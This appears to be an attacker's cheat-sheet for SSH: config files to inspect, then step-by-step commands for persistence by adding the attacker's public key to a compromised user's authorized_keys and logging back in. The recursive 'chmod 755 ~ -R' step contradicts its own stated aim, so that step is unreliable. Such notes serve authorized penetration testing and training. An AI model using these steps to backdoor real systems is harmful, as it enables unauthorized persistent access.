# Examine Configuration Files
- ssh_config
- sshd_config
- autorized_keys
- ssh_known_hosts
- .shosts

# Establish Persistence
If ssh open, you can add your attacker box public key to the machine so that you can ssh into it on-demand.
- Note that this only works if the target user you have a shell on has an interactive login shell(/bin/sh, /bin/bash) assigned to their user in the passwd file.
1. (Target) See if there is a .ssh folder in the home directory of the target user.  If not, create one.
```
ls -lat ~
mkdir ~/.ssh
```
2. (Target) Ensure that there is an authorized_keys file within the .ssh folder.
```
ls -lat ~/.ssh
cd ~/.ssh; touch authorized_keys
```
3. (Target) Ensure that the file permissions on the target user home folder (~), .ssh directory (~/.ssh), and authorized_keys file (~/.ssh/authorized_keys) are only writable by the target user (no other groups or gloabl) and readable by at least the target user.  If not, change the permissions to ensure this.
```
chmod 755 ~ -R
```
4. (Local) Ensure that you have a public / private key pair generated.  If not, generate one.
```
ls -lat ~/.ssh
ssh-keygen
```
5. (Local) Ensure the permissions on your private key (file with id prefix without the .pub suffix) is only readable and writeable by you.
```
chmod 600 ~/.ssh/[private key file like id_rsa]
```
6. (Local and Target) Copy the public key (file with id prefix with the .pub suffix) from our local machine to the authorized_keys file on the target system.
```
#Local# cat ~/.ssh/[public keyfile like id_rsa.pub]|clip
#Target# echo [pasted public key value] >> ~/.ssh/authorized_keys
```
7. (Local) Attempt an ssh login to the target machine as the target user.
```
ssh -i ~/.ssh/[private key like id_rsa] [target user]@[target IP]
```
